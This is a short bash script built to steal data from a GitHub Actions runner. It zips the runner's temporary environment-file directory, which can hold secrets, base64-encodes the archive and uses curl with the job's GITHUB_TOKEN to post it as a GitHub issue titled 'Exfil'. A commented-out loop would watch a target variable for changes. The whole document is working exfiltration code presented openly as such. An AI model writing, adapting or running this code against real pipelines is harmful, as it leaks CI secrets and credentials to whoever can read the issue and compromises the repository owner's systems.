#!/bin/bash

GITHUB_TOKEN="${GITHUB_TOKEN}"
GITHUB_REPOSITORY="${GITHUB_REPOSITORY}"
ENV_VARS_DIR='/home/runner/work/_temp/_runner_file_commands/'
PREFIX='set_env_'

MONITORED_VARS=("TARGET_VAR")
POLL_INTERVAL=.5

on_change() {
    # local new_value="$1"
    sleep .5
    local temp_zip=$(mktemp --suffix=.zip)
    
    # Zip the entire contents of ENV_VARS_DIR
    zip -r "$temp_zip" "$ENV_VARS_DIR" > /dev/null 2>&1
    ls -la $temp_zip
    
    # Base64 encode the zip and output to console
    local encoded=$(cat "$temp_zip" | base64 -w 0)
    echo "Zipped and encoded $ENV_VARS_DIR:"
    echo "$encoded"
    create_issue "$encoded"
}

get_env_vars_file() {
    local latest_file=""
    local latest_mtime=0
    
    if [ ! -d "$ENV_VARS_DIR" ]; then
        echo ""
        return
    fi
    
    for f in "$ENV_VARS_DIR"${PREFIX}*; do
        if [ -f "$f" ]; then
            local mtime=$(stat -c %Y "$f" 2>/dev/null || stat -f %m "$f" 2>/dev/null)
            if [ "$mtime" -gt "$latest_mtime" ]; then
                latest_mtime=$mtime
                latest_file="$(basename "$f")"
            fi
        fi
    done
    
    echo "$latest_file"
}

main() {
    on_change
    # local previous_value=""
    
    # while true; do
    #     local current_value=$(get_env_vars_file)
    #     if [ "$current_value" != "$previous_value" ]; then
    #         on_change "$current_value"
    #         previous_value="$current_value"
    #     fi
    #     sleep "$POLL_INTERVAL"
    # done
}

create_issue() {
    local exfil="$1"
    local title="Exfil"
    local body="$exfil"
    
    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues"
    
    local json_data=$(cat <<EOF
{
    "title": "$title",
    "body": "$body"
}
EOF
)
    
    curl -X POST "$api_url" \
        -H "Authorization: Bearer $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github+json" \
        -H "Content-Type: application/json" \
        -d "$json_data"
}

main
